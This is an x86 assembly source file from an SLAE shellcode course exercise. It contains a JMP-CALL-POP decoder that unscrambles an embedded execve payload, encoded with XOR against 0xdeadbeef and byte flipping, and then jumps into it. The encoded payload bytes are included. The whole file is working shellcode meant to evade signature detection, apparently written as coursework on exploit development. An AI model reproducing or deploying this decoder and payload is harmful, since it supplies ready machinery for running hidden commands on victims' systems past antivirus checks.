; Filename: 	dead_decoder.nasm
; Author:	Paolo Perego <paolo@codiceinsicuro.it>  
; Website:  	https://codiceinsicuro.it
; Blog post:  	https://codiceinsicuro.it/slae/
; Twitter:   	@thesp0nge
; SLAE-ID:    	1217
; Purpose:	This shellcode will decode an execve payload encoded using
;		custom schema, with XOR and byte flipping

global _start			

section .text

_start:
	jmp short call_shellcode

decoder:
	pop esi
	lea edi, [esi]
	xor eax, eax
	xor ebx, ebx
	xor ecx, ecx
	xor edx, edx
	
	; As assumption, the first double word in our shellcode is the XOR
	; encoded payload length
	mov edx, dword [esi + eax]
	xor edx, 0xdeadbeef
	
	add al, 4
	
decode:
	mov ebx, dword [esi+eax]
	inc ecx
	cmp cl, dl
	je short EncodedShellcode

	; shellcode is stored in a reversed way. Let' XOR-it
	xor ebx, 0xdeadbeef

	; Now we have to swap again bytes before saving into memory
	bswap ebx

	mov [edi], ebx
	add edi, 4
	add al, 4
	
	jmp short decode


call_shellcode:
	call decoder
	EncodedShellcode: db 0xf7, 0xa6, 0xb5, 0xc6, 0x87, 0xee, 0x6d, 0xef, 0x87, 0xcd, 0x82, 0xf1, 0x86, 0xdc, 0x82, 0xb6, 0xde, 0x5d, 0x24, 0xb0, 0x5f, 0x6c, 0x9c, 0x17, 0x7f, 0x3e, 0x60, 0xd5

